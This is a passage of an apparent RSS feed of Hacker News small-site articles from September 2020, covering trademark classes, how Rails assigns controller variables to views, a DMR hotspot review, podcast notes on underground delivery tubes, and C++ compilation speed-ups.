and beauty care for human beings or animals; agriculture, horticulture and forestry services.</span></p><p><strong>Trademark Class 45.</strong><span data-preserver-spaces="true">&nbsp;&nbsp;Legal services; security services for the protection of property and individuals; personal and social services rendered by others to meet the needs of individuals.</span></p><p><span data-preserver-spaces="true">How to select a trademark?</span></p><p><span data-preserver-spaces="true">When selecting classes in a trademark application on IP Australia, there are two ways to choose courses, either by picklist or by non-picklist.</span></p><p><strong>Picklist</strong></p><p><span data-preserver-spaces="true">A picklist trademark application will provide you with the most commonly used goods/services in a trademark class for you to select. This may be a suitable choice for your trademark. When it comes to determinizing whether your trademark is capable of registration, an application which uses picklist goods/services may be determined quicker as …</span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.legallyinsightful.com/2020/09/what-are-trademark-classes.html">https://www.legallyinsightful.com/2020/09/what-are-trademark-classes.html</a></em></p>]]>
            </description>
            <link>https://www.legallyinsightful.com/2020/09/what-are-trademark-classes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24538359</guid>
            <pubDate>Sun, 20 Sep 2020 23:37:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Does Rails Assign Variables to Rendered Views?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24537617">thread link</a>) | @devrob
<br/>
September 20, 2020 | https://blog.robsdomain.com/how-does-rails-assign-view-variables/ | <a href="https://web.archive.org/web/*/https://blog.robsdomain.com/how-does-rails-assign-view-variables/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <p><em>If you enjoy this article you may be interested in the book I am working on called <a href="https://buildingcryptotradingbots.com/">Building and Deploying Crypto Trading Bots</a>.</em></p><p>Throughout this post, we will investigate one source of that "Rails magic" that perplexes developers: how Rails assigns Controller instance variables to view templates.</p><p>Take the following for example:</p><figure><pre><code># If you inspect action_controller.rb you will find it inerhits from ActionController::Base
class MyController &lt; ApplicationController
 def index
  @my_index_var = [1,2,3,4]
 end
end</code></pre><figcaption>app/controller/my_controller.rb</figcaption></figure><figure><pre><code>&lt;% @my_index_var.each do |i| %&gt;
  &lt;p&gt; Number: &lt;%= I %&gt; &lt;/p&gt;
&lt;% end %&gt;</code></pre><figcaption>app/views/my_controller/index.html.erb</figcaption></figure><p>Have you ever wondered how on earth the view template <code>index.html.erb</code> gets access to the instance variable <code>@my_index_var</code> ? Well, let's find out.</p><h3 id="what-is-rails-anyway">What is Rails Anyway?</h3><p>Without jumping too far into Rails source code (yet), recall that the Ruby on Rails source code isn't a massive monolithic code base. Rather, it is a collection of isolated Ruby gems that are strung together to make up the tool we call Rails. Inside the &nbsp;codebase, the responsibilities of template rendering, rack request routing, object relational mapping and more are divided across &nbsp;several key gems that are usually prefixed with <code>Action*</code> or <code>Active*</code> . All these gems work together to deliver the end framework you and I use for web application development. With the primer out of the way, let's begin the journey to expose how controller instance variables are assigned to views.</p><h3 id="actionpack-d">ActionPack'd</h3><p>Our first stop is the gem called <code>ActionPack</code>. <code><a href="https://rubygems.org/gems/actionpack">ActionPack</a></code> defines several important modules including <code>ActionController</code>, <code>ActionDispatch</code> and <code>AbstractController</code>. Thematically the gem revolves around framework controller code, rendering and routing of rack requests.</p><p>For our investigation, the first class in <code>ActionPack</code> to take a look at is &nbsp;<code><a href="https://github.com/rails/rails/blob/661da266b94909574426fd1121ef13b800e01b9a/actionpack/lib/action_controller/base.rb#L166">ActionController::Base</a></code> . This is the base class that all your application controllers will inherit from. </p><pre><code>class ApplicationController &lt; ActionController::Base
end

class Posts &lt; ApplicationController
end</code></pre><p>In essence <code>ActionController::Base</code> is the core of a web request in Rails. It gives controllers the ability to define actions for requests, and have requests routed to those actions in order to render a template or redirecting somewhere else. <code>ActionController::Base</code> inherits from a parent class <a href="https://github.com/rails/rails/blob/661da266b94909574426fd1121ef13b800e01b9a/actionpack/lib/action_controller/metal.rb#L119"><code>ActionController::Metal</code></a> which in turn inherits from <code>AbstractController::Base</code>. <code>ActionController::Metal</code> isn't very interesting so we won't spend too much time on it. The in-line source comments describes it as:</p><p><em>... the simplest possible controller, providing a valid Rack interface without the additional niceties provided by ActionController::Base</em></p><p>Circling back to <code>ActionController::Base</code>, the class itself doesn't actually define many interesting methods. Instead <code>ActionController::Base</code> is a composite of <a href="https://github.com/rails/rails/blob/master/actionpack/lib/action_controller/base.rb#L210https://github.com/rails/rails/blob/661da266b94909574426fd1121ef13b800e01b9a/actionpack/lib/action_controller/base.rb#L210">various modules</a> such as <code>UrlFor</code>, <code>Redirecting</code>, <code>HttpAuthentication</code>, <code>Logging</code>, <code>Cookies</code> that are loaded into the class at require time. One module in deserving of our focus is &nbsp;<code>AbstractController::Rendering</code>. </p><p>The <code>AbstractController::<code>Rendering</code></code> module provides <code>ActionController</code> a variety of handy methods including the <code><a href="https://github.com/rails/rails/blob/661da266b94909574426fd1121ef13b800e01b9a/actionpack/lib/abstract_controller/rendering.rb#L23">render</a></code> method we know and love. </p><figure><pre><code>def render(*args, &amp;block)
  options = _normalize_render(*args, &amp;block)
  rendered_body = render_to_body(options)
  if options[:html]
    _set_html_content_type
  else
    _set_rendered_content_type rendered_format
  end
  _set_vary_header
  self.response_body = rendered_body
end</code></pre><figcaption><a href="https://github.com/rails/rails/blob/661da266b94909574426fd1121ef13b800e01b9a/actionpack/lib/abstract_controller/rendering.rb#L23">https://github.com/rails/rails/blob/661da266b94909574426fd1121ef13b800e01b9a/actionpack/lib/abstract_controller/rendering.rb#L23</a></figcaption></figure><pre><code>class Posts &lt; ApplicationController
  def new
    render 'new'
  end
end</code></pre><p>In addition to <code>render</code>, the module also contains a method called <code><a href="https://github.com/rails/rails/blob/661da266b94909574426fd1121ef13b800e01b9a/actionpack/lib/abstract_controller/rendering.rb#L63">view_assigns</a></code> . The <code>view_assigns</code> method is pretty quirky:</p><figure><pre><code># This method should return a hash with assigns.
# You can overwrite this configuration per controller.
def view_assigns
  variables = instance_variables - _protected_ivars

  variables.each_with_object({}) do |name, hash|
    hash[name.slice(1, name.length)] = instance_variable_get(name)
  end
end</code></pre><figcaption>https://github.com/rails/rails/blob/661da266b94909574426fd1121ef13b800e01b9a/actionpack/lib/abstract_controller/rendering.rb#L63</figcaption></figure><p>Basically, it calls the Ruby base <code>Object</code> method <code><a href="https://ruby-doc.org/core-2.7.1/Object.html#method-i-instance_variables">instance_variables</a></code> which returns an Array of all the currently defined instance variables for an object and creates a hash mapping their names to their values. &nbsp;Now, recall that <code>AbstractController::Rendering</code> is a <strong>module</strong> that is mixed in the <strong>class</strong> <code>ActionController::Base</code> which is what your concrete controller implementation inherits from. This means that if <code>view_assigns</code> is invoked from your controller all the currently defined instance variables will be assigned to this hash. Interesting.... We've discovered how the instance variables are captured but how does the controller connect to the view?</p><h3 id="actionview">ActionView</h3><p>Returning to our previous note about Rails being built from "Action" type gems, view and templating logic live in a fun little gem called <code><a href="https://rubygems.org/gems/actionview">ActionView</a></code>. <code>ActionView</code> is responsible for understanding <em>how to render</em> different template engines like embedded ruby, and HTML. To draw the lines of responsibility a bit more clearly, <code>ActionController</code> can tell us <em>what</em> to render, but, it does not know <em>how </em>to render it. That's <code>ActionView</code>'s job.</p><p>The base class for <code>ActionView</code> is somewhat anti-climatically named <code><a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/base.rb#L141">ActionView::Base</a></code>. The class itself does quite a bit of serious business. The job of hierarchal template rendering doesn't sound like a laughing matter (but then again maybe it is? <a href="https://twitter.com/dhh">DHH</a> seems to have a lot of fun on Twitter). Anyway, when an <code>ActionView</code> is <a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/base.rb#L243">instantia</a>ted it eventually calls an important method named <a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/base.rb#L267">assign</a> with a payload called <code>assigns</code>:</p><figure><pre><code>def assign(new_assigns) # :nodoc:
  @_assigns = new_assigns.each do |key, value|
    instance_variable_set("@#{key}", value)
  end
end</code></pre><figcaption><a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/base.rb#L206">https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/base.rb#L206</a></figcaption></figure><p>The <code>ActionView::Base</code> <code>assign</code> method is responsible for taking the <code>new_assigns</code> argument iterating through it to define instance variables using the <code>instance_variable_set</code> method. These instance variables are named, assigned and set in the template object using the key and value pairs in the <code>new_assigns</code> hash. This means that the template object rendered will have access to these variables immediately after being instantiated. Does this look familiar?</p><figure><pre><code>&lt;% @my_index_var.each do |i| %&gt;
  &lt;p&gt; Number: &lt;%= I %&gt; &lt;/p&gt;
&lt;% end %&gt;</code></pre><figcaption>app/views/my_controller/index.html.erb</figcaption></figure><p>Ok so that all makes sense but how and where does the <code>new_assigns</code> payload come from?</p><h3 id="actionview-take-two">ActionView Take Two</h3><p>In the same <code>ActionView</code> gem lives a module called <code>ActionView::Rendering</code> where a view's "context" is built before it is rendered to the screen. In specific, the <code>ActionView::Rendering</code> module has a public hook method called <code><a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/rendering.rb#L101">render_to_body</a></code> which is invoked by <code>ActionController</code> when the <a href="https://github.com/rails/rails/blob/661da266b94909574426fd1121ef13b800e01b9a/actionpack/lib/abstract_controller/rendering.rb#L25"><code>render</code> method</a> is called. Under the hood <code>render_to_body</code> calls a <strong>private</strong> method <code><a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/rendering.rb#L108">_render_template</a></code>:</p><figure><pre><code> def _render_template(options)
    variant = options.delete(:variant)
    assigns = options.delete(:assigns)
    
    context = view_context

    context.assign assigns if assigns
    lookup_context.variants = variant if variant

    rendered_template = context.in_rendering_context(options) do |renderer|
      renderer.render_to_object(context, options)
    end

    rendered_format = rendered_template.format || lookup_context.formats.first
    @rendered_format = Template::Types[rendered_format]

    rendered_template.body
end</code></pre><figcaption><a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/rendering.rb#L108">https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/rendering.rb#L108</a></figcaption></figure><p>Now, <code>_render_template</code> does quite a number of things but the important line for us to close in on is the invocation of the method <code><a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/rendering.rb#L111">view_context</a></code>.</p><p> The <code><a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/rendering.rb#L92">view_context</a></code> method is the glue that wraps everything together here:</p><figure><pre><code> def view_context
  view_context_class.new(lookup_context, view_assigns, self)
end</code></pre><figcaption><a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/rendering.rb#L92">https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/rendering.rb#L92</a></figcaption></figure><p>It instantiates a new <code><a href="https://github.com/rails/rails/blob/d2cdf0be675b44771f950697fc0b19ef0ea453f9/actionview/lib/action_view/rendering.rb#L65">ActionView::Base</a></code> object (<code>view_context_class</code>) and passes it an <code>assigns</code> hash consisting of... a call to the <code>view_assigns</code> method from <code>AbstractController::Base</code> !!</p><p>This means that a hash of the currently defined instance variables for the controller that called render will be passed along as an argument to the <code>ActionView::Base</code> <code>initialize</code> method. Nice! We've found the source. Here is the the above words in image form:</p><figure><img src="https://blog.robsdomain.com/content/images/2020/06/Rails-Rendering-Variables.png"></figure><p>Phew... quite the journey but we've pulled &nbsp;the curtains back on one of the more opaque parts of the Ruby on Rails framework and have made it through in one piece.</p><p>Have fun!</p>
        </section>

        
    </article>
</div></div>]]>
            </description>
            <link>https://blog.robsdomain.com/how-does-rails-assign-view-variables/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24537617</guid>
            <pubDate>Sun, 20 Sep 2020 21:37:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BridgeCom Systems SkyBridge Hotspot Review]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 10 (<a href="https://news.ycombinator.com/item?id=24537600">thread link</a>) | @RFTinker
<br/>
September 20, 2020 | http://k0lwc.com/bridgecom-systems-skybridge-hotspot-review/ | <a href="https://web.archive.org/web/*/http://k0lwc.com/bridgecom-systems-skybridge-hotspot-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-248">
	<!-- .entry-header -->

	<div>
		
<p>Are you a ham radio operator interested in DMR? Getting started can be intimidating, but not with the <a href="https://www.bridgecomsystems.com/pages/plug-and-play-878-plus-skybridge">SkyBridge Hotspot DMR Plug N’ Play package</a> from BridgeCom Systems. </p>



<p>BridgeCom’s SkyBridge dual band hotspot is the latest hotspot on the market for amateur radio operators. What makes it such a compelling buy is the ease at which you can get on the air. BridgeCom will take care of programming the radio <em>and</em> the hotspot before it ships. Once it arrives, simply plug in the hotspot, turn on the radio and you’re on the air rag chewing. </p>



<h2>BridgeCom SkyBridge Hotspot features</h2>



<p>The SkyBridges uses a Pi-Zero board with a custom MMDVM hat putting out 10mW of output power. More than enough power to blanket your entire house and property (unless you live on acres of property) with seamless digital coverage. </p>



<ul><li>Wired and wireless Internet capability</li><li>High-performance 32-bit ARM processor</li><li>SkyBridge&nbsp;Board Fully Assembled And Tested</li><li><a href="https://www.pistar.uk/">Pi-Star Operating System</a></li><li>Compatible with DMR, D-Star, Yaesu System Fuzion (YSF),&nbsp; NXDN, P25 and POCSAG radios</li><li>Supports the following Cross-Mode Capabilities: DMR to NXDN, DMR to YSF, YSF to DMR and YSF to NXDN</li><li>Supports operation in both 2m (144Mhz) and 70cm (440Mhz) bands</li><li>Onboard LEDs to show status (Tx, Rx, PTT, Mode)</li><li>Up to 10mW RF power</li><li>SMA antenna connector, dual-band VHF/UHF antenna included</li><li>MMDVM open-source firmware is pre-loaded and is easily upgraded via software</li><li>Built-in 1.3″ OLED display</li><li>Connection for Nextion LCD display</li><li><strong>1 Year Warranty</strong></li><li><strong>FCC Part 15 Certified</strong></li></ul>



<p>The most important thing you get, in my opinion, is fantastic support form BridgeCom. You’re paying for the piece of mind you’ll have someone to call if you have troubles, or something malfunctions. You will also get access to BridgeCom University, and online portal that provides a long list of videos that will help you learn everything you need to know about DMR. </p>







<h2>How far does the BridgeCom SkyBridge reach?</h2>



<p>Many hams wonder just how far a little 10mW transmitter will work. The answer is— surprisingly far. I set my SkyBridge near the window in my basement and was able to walk about 600 feet in my suburban neighborhood before losing the signal from my hotspot. Don’t worry about having coverage around your home or property. This hotspot has you covered! I <a href="http://k0lwc.com/what-is-the-range-of-a-dmr-hotspot/">tested the coverage from my PiSpot</a> with a high gain antenna at 40 feet HAAT, it’s worth checking out. </p>



<h2>Is the SkyBridge hotspot reliable?</h2>



<p>I was able to use the SkyBridge for a week and I found it to be incredibly reliable. It handled my day-to-day just as well as my PiSpot hotspot running a Raspberry PiB3 board and a DVMega hat. In fact, it ran cooler in temperature than my custom built PiB3. </p>



<h2>Can I talk to friends who use D-Star or YSF?</h2>



<p>Yes! The hotspot supports cross-mode capability thanks to the Pi-Star firmware. You can use your DMR radio to talk to your ham radio friends who may be using D-Star, YSF, P25 or NXDN. This is huge. It sucks we have a fragmented digital protocol system. With this hotspot that becomes less of an issue.</p>



<h2>Is the SkyBridge hotspot worth the money?</h2>



<p>If you’re a ham looking to make the jump into DMR, I think it’s absolutely worth it. The real value of the SkyBridge Plug N’ Play package is the ease of getting on the air. BridgeCom makes it incredibly easy. Pair that with access to BridgeCom University you can watch hours and hours worth of tutorials on DMR — that’s a lot of value in a single package. </p>



<p>You can buy the BridgeCom SkyBridge hotspot <a href="https://www.bridgecomsystems.com/pages/skybridge">here</a>, or get their SkyBridge Plug N’ Play package <a href="https://www.bridgecomsystems.com/pages/plug-and-play-878-plus-skybridge">here</a>. </p>



<h2>Take a look at what you get in this YouTube video</h2>



<figure><p>
<iframe id="_ytid_54838" width="640" height="360" data-origwidth="640" data-origheight="360" src="https://www.youtube.com/embed/bghFnES-KI4?enablejsapi=1&amp;rel=0&amp;modestbranding=0&amp;autoplay=0&amp;cc_load_policy=0&amp;iv_load_policy=1&amp;loop=0&amp;fs=1&amp;playsinline=0&amp;autohide=2&amp;theme=dark&amp;color=red&amp;controls=1&amp;" title="YouTube player" allow="autoplay; encrypted-media" allowfullscreen="" data-no-lazy="1" data-skipgform_ajax_framebjll=""></iframe>
</p></figure>
<br>
			</div><!-- .entry-content -->
</article></div>]]>
            </description>
            <link>http://k0lwc.com/bridgecom-systems-skybridge-hotspot-review/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24537600</guid>
            <pubDate>Sun, 20 Sep 2020 21:35:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building underground tunnels for 30 second delivery times]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24537480">thread link</a>) | @Mat_Sherman
<br/>
September 20, 2020 | https://share.transistor.fm/s/feaa771d | <a href="https://web.archive.org/web/*/https://share.transistor.fm/s/feaa771d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  

  <article>
    <section>
      <h4>Summary</h4>
      <p>Garrett McCurrach is the cofounder of Pipedream Labs. Pipedream is a network of underground tubes that offers near-instantaneous delivery of objects to and from homes and businesses.
</p>
    </section>
        <section>
          <h4>Show Notes</h4>
          <div><p>Garrett McCurrach is the cofounder of <a href="https://pipedreamlabs.co/">Pipedream</a>. Pipedream is a network of underground tubes that offers near-instantaneous delivery of objects to and from homes and businesses.</p><p><strong>Listen to this episode if you:</strong></p></div><ul><li>You love moonshots</li><li>You want to see underground transportation more ubiquitous&nbsp;</li><li>You want to hear the big vision for Pipedream.</li></ul><p><strong>Thanks to Primeflow for sponsoring this episode of FTF!<br></strong>Itâ€™s time to focus on your biggest advantage - your relationships. Partner up with your network and drive business. Their software takes care of everything else. With Primeflow, you can source partners, manage your leads, and collect your fees, all within one easy software product. Check it out <a href="https://bit.ly/3hMvKET">here</a>.<strong><br></strong><br></p><p><strong><a target="_donate" rel="payment" title="â˜… Support this podcast by donating â˜…" href="https://forwardthinking.substack.com/">â˜… Support this podcast by donating â˜…</a></strong></p>
        </section>
    <section>
      <h4>What is Forward Thinking Founders?</h4>
      <p>Forward Thinking Founders is a podcast where Mat interviews high potential founders with early stage companies. This allows us to see inside the brain of genius founders before the rest of the world knows they even exist. On this show, you'll learn all about how to start a startup, pros and cons of different verticals, and learn the backstory and vision of tomorrow's billion-dollar companies, straight from the founders. With guests coming from Y Combinator, The Thiel Fellowship, Pioneer, and the f20r.com network, you're sure to get a sneak peek at world-class founders at work, every day. This is Forward Thinking Founders.</p>
    </section>
  </article>
</div></div>]]>
            </description>
            <link>https://share.transistor.fm/s/feaa771d</link>
            <guid isPermaLink="false">hacker-news-small-sites-24537480</guid>
            <pubDate>Sun, 20 Sep 2020 21:16:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Little Things: Speeding up C++ compilation]]>
            </title>
            <description>
<![CDATA[
Score 128 | Comments 80 (<a href="https://news.ycombinator.com/item?id=24537231">thread link</a>) | @ingve
<br/>
September 20, 2020 | https://codingnest.com/the-little-things-speeding-up-c-compilation/ | <a href="https://web.archive.org/web/*/https://codingnest.com/the-little-things-speeding-up-c-compilation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

        <section>
            <p><em>The Little Things</em> is a new series of posts based on Locksley's internal training sessions. Often the contents are either proprietary (e.g. the inner workings of specific master key platforms) or not generally interesting (e.g. our internal libraries and tooling), but sometimes the contents are suitable for a wider audience, in which case I want to share them.</p>
<hr>
<p>This post will be about some source-level techniques for speeding up C++ compilation, and their (dis)advantages. It will <strong>not</strong> talk about things external to C++, such as buying better hardware, using a better build system, or using smarter linker<sup><a href="#fn1" id="fnref1">[1]</a></sup>. It will also not talk about the tooling that can find compilation bottlenecks, as that will be a subject of a later post.</p>
<h2 id="overviewofccompilationmodel">Overview of C++ compilation model</h2>
<p>I will start with a quick overview of the C++ compilation model, to provide context for some of the tricks I will show later. Note that this overview will be very coarse, if you want a detailed look at the subtleties of the <em>9</em> phase compilation model defined in the C++ standard, look elsewhere.</p>
<p>We will consider the compilation of C++ binary to happen in 3 steps:</p>
<ol>
<li>Preprocessing</li>
<li>Compilation</li>
<li>Linking</li>
</ol>
<h3 id="preprocessing">Preprocessing</h3>
<p>The first step is preprocessing. During it, the preprocessor takes a .cpp file and parses it, looking for <em>preprocessor directives</em>, such as <code>#include</code>, <code>#define</code>, <code>#ifdef</code>, etc.</p>
<p>Let's take this super simple file as an example</p>
<pre><code>// tiny.cpp
#define KONSTANTA 123

int main() {
    return KONSTANTA;
}
</code></pre>
<p>It contains one preprocessor directive, <code>#define</code>. It says that any following occurence of <code>KONSTANTA</code> should be replaced with <code>123</code>. Running the file through a preprocessor leads to output like this one:</p>
<pre><code>$ clang++ -E tiny.cpp
# 1 "tiny.cpp"
# 1 "&lt;built-in&gt;" 1
# 1 "&lt;built-in&gt;" 3
# 383 "&lt;built-in&gt;" 3
# 1 "&lt;command line&gt;" 1
# 1 "&lt;built-in&gt;" 2
# 1 "tiny.cpp" 2


int main() {
    return 123;
}
</code></pre>
<p>We can see that in <code>return KONSTANTA</code> the <code>KONSTANTA</code> part was replaced with <code>123</code>, as it should be. We also see that the compiler left itself a bunch of other notes, that we do not care about that much<sup><a href="#fn2" id="fnref2">[2]</a></sup>.</p>
<p>The big problem with the preprocessor model is that the <code>#include</code> directive literally means "copy-paste all of this file's contents here". Of course, if that file's contents contain further <code>#include</code> directives, then more files will be opened, their contents copied out, and in turn, the compiler will have more code to deal with. In other words, preprocessing increases the size of the input, usually significantly so.</p>
<p>The following is a simple "Hello World" in C++, using streams.</p>
<pre><code>// hello-world.cpp
#include &lt;iostream&gt;

int main() {
    std::cout &lt;&lt; "Hello World\n";
}
</code></pre>
<p>After preprocessing, the file will have <strong>28115</strong><sup><a href="#fn3" id="fnref3">[3]</a></sup> lines for the next step, compilation, to deal with.</p>
<pre><code>$ clang++ -E hello-world.cpp | wc -l
28115
</code></pre>
<h3 id="compilation">Compilation</h3>
<p>After a file is preprocessed, it is compiled into an <em>object file</em>. Object files contain the actual code to run, but cannot be run without linking. One of the reasons for this is that object files can refer to symbols (usually functions) that they do not have the definition (code) for. This happens, e.g. if a .cpp file uses a function that has been declared, but not defined, like so:</p>
<pre><code>// unlinked.cpp
void bar(); // defined elsewhere (hopefully)

void foo() {
    bar();
}
</code></pre>
<p>You can look inside a compiled object file to see what symbols it provides and what symbols it needs, using <code>nm</code> (Linux) or <code>dumpbin</code> (Windows). If we look at the output for the <code>unlinked.cpp</code> file, we get this:</p>
<pre><code>$ clang++ -c unlinked.cpp &amp;&amp; nm -C unlinked.o
                 U bar()
0000000000000000 T foo()
</code></pre>
<p><code>U</code> means that the symbol is not defined in this object file. <code>T</code> means that the symbol is in the text/code section and that it is exported, which means that other object files can get <code>foo</code> from this <code>unlinked.o</code>. It is important to know that symbols might also be present in an object file, but not be available to other object files. Such symbols are marked with <code>t</code>.</p>
<h3 id="linking">Linking</h3>
<p>After all the files have been compiled into object files, they have to be <em>linked</em> into the final binary artefact. During linking, all the various object files are smashed together in a specific format, e.g. ELF, and the various references to undefined symbols in object files are resolved with the address of the symbol, as provided by a different object file (or library).</p>
<p>With this overview done, we can start tackling the different ways to speed up the compilation of your code. Let's start simple.</p>
<h2 id="includeless"><code>#include</code> less</h2>
<p>Including a file usually brings in a <em>lot</em> of extra code, which the compiler then needs to parse and check. Thus the simplest, and usually also the biggest, way to speed up the compilation of your code, is to just <code>#include</code> fewer files. Reducing the include set is especially beneficial in header files, as they are likely to be included from other files, thus amplifying the impact of your improvements.</p>
<p>The easiest way to do this is to remove any unused includes. Unused includes shouldn't happen often, but sometimes they are left behind during refactoring, and using a tool like <a href="https://include-what-you-use.org/">IWYU</a> <em>can</em><sup><a href="#fn4" id="fnref4">[4]</a></sup> make it simple to do. However, just cleaning up unused includes is unlikely to provide many benefits, and so you will have to reach for bigger guns, forward declarations and manual outlining.</p>
<p>But before explaining forward declarations and manual outlining, I want to go over the costs of header inclusion quickly, so we can build up intuition on what sort of speed-ups we can expect from pruning down include graphs.</p>

<p>The table below shows the time required by Clang<sup><a href="#fn5" id="fnref5">[5]</a></sup> to compile a file that <em>only</em> includes some stdlib headers.</p>

<table>
<thead>
<tr>
<th>header(s) included</th>
<th>time to compile (ms)</th>
<th>difference from baseline (ms)</th>
</tr>
</thead>
<tbody>
<tr>
<td>none</td>
<td>11.3  ± 0.2</td>
<td>-</td>
</tr>
<tr>
<td><code>&lt;vector&gt;</code></td>
<td>68.8  ± 0.3</td>
<td>57.5 ±  0.36</td>
</tr>
<tr>
<td><code>&lt;string&gt;</code></td>
<td>136.3  ± 0.8</td>
<td>125.0 ±  0.82</td>
</tr>
<tr>
<td><code>&lt;stdexcept&gt;</code></td>
<td>137.0  ± 0.8</td>
<td>125.7 ±  0.82</td>
</tr>
<tr>
<td><code>&lt;vector&gt;</code>, <code>&lt;string&gt;</code></td>
<td>155.3  ± 0.9</td>
<td>144.0 ±  0.92</td>
</tr>
<tr>
<td><code>&lt;string&gt;</code>, <code>&lt;stdexcept&gt;</code></td>
<td>136.7  ± 0.7</td>
<td>125.4 ±  0.73</td>
</tr>
<tr>
<td><code>&lt;vector&gt;</code>, <code>&lt;string&gt;</code>, <code>&lt;stdexcept&gt;</code></td>
<td>156.1  ± 0.8</td>
<td>144.8 ±  0.82</td>
</tr>
</tbody>
</table>
<p>The first row shows the time needed to compile a completely empty file, to provide a baseline time required by the compiler to start, read the file, and do nothing. The other lines are more interesting. As the second line says, just including <code>&lt;vector&gt;</code> adds 57 ms to compilation times, even though there will be no actual line emitted. As we can see, the cost to include <code>&lt;string&gt;</code> is more than double of <code>&lt;vector&gt;</code>, and the cost to include <code>&lt;stdexcept&gt;</code> is about the same as for <code>&lt;string&gt;</code>.</p>
<p>More interesting are the rows for combinations of headers, because no combination of headers is as expensive as compiling each of them on its own. The reason is quite simple: their internal include overlap. The most extreme case is <code>&lt;string&gt;</code> + <code>&lt;stdexcept&gt;</code>, because <code>&lt;stdexcept&gt;</code> is basically <code>&lt;string&gt;</code> + couple of types deriving from <code>std::exception</code>.</p>
<p>What you should take away from this are two things:</p>
<ul>
<li>Even if you do not use anything from a header, you still have to pay for it.</li>
<li>Include costs do not neatly sum, nor subtract.</li>
</ul>
<p>Now let's go through techniques we can use to include fewer files.</p>
<h3 id="forwarddeclarations">Forward declarations</h3>
<p>Quite often, when we mention a type, we only need to know that it exists but do not need to know its definition. The common case is creating a pointer or a reference to a type, in which case you need a knowledge that the type exists (a <em>forward declaration</em>), but not what it looks like (a <em>definition</em>).</p>
<p>As an example, this header is valid:</p>
<pre><code>class KeyShape; // forward declaration

size_t count_differences(KeyShape const&amp; lhs, KeyShape const&amp; rhs);
</code></pre>
<p>as long as the implementation file includes the appropriate headers:</p>
<pre><code>#include "key-shape.hpp" // provides the full definition of KeyShape

size_t count_differences(KeyShape const&amp; lhs, KeyShape const&amp; rhs) {
    assert(lhs.positions() == rhs.positions());
    ...
}
</code></pre>
<p>You can also use forward declaration together with some templated classes, whose size does not change depending on the template argument, e.g. <code>std::unique_ptr</code> and <code>std::vector</code><sup><a href="#fn6" id="fnref6">[6]</a></sup>. However, doing so can force you to outline your constructors, destructors and other special member functions (<em>SMFs</em>), as those usually need to see the full definition of the type. Your code then ends up looking like this:</p>
<pre><code>// foo.hpp
#include &lt;memory&gt;

class Bar;

class Foo {
    std::unique_ptr&lt;Bar&gt; m_ptr;
public:
    Foo(); // = default;
    ~Foo(); // = default;
};
</code></pre>
<pre><code>// foo.cpp
#include "bar.hpp"

Foo::Foo() = default;
Foo::~Foo() = default;
</code></pre>
<p>Notice that we still use the compiler-generated default constructor and destructor, but do so in the <code>.cpp</code> file, where we see the full definition of <code>Bar</code>. I also like to use the <code>// = default;</code> comment to signal to other programmers reading the code that the SMF is explicitly declared but will be defaulted, and thus there won't be any special logic in it.</p>
<p>When using this technique, please remember that the outlined functions cannot be inlined without LTO. In other words, you probably do not want to outline <em>every</em> function just because you can, because calling trivial functions can be much more expensive than inlining their code directly.</p>
<h3 id="explicitoutlining">Explicit outlining</h3>
<p>The idea underlying explicit outlining is quite simple: sometimes we get better results if a piece of code is explicitly split away from a function. One of the most common reasons is, perhaps ironically, improving inlining by making the common path of a function small. However, in our case, the reason for doing this is to improve the compilation times.</p>
<p>If a piece of code is expensive to compile, and inlining it is not crucial for performance, only one TU has to pay for compiling it. The canonical example of this is throwing an exception in general, and exceptions from <code>&lt;stdexcept&gt;</code> in particular. Throwing an exception generates quite a lot of code, and throwing more complex standard exception types, such as <code>std::runtime_error</code>, also requires an expensive<sup><a href="#fn7" id="fnref7">[7]</a></sup> header, <code>&lt;stdexcept&gt;</code> to be included.</p>
<p>By instead replacing all <code>throw foo;</code> statements with calls to a helper function along the lines of <code>[[noreturn]] void throw_foo(char const* msg)</code>, the call sites become …</p></section></article></div></div>
